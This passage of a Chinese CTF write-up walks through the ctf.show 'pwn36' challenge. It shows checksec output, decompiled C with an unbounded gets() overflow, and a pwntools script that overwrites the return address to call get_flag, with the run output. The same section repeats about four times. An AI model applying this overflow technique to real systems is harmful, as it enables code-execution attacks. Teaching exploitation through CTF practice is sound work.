<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-22"><a href="#pwn36-22" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn36-23"><a href="#pwn36-23" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn36-24"><a href="#pwn36-24" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>



<h2 id="pwn36-25"><a href="#pwn36-25" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
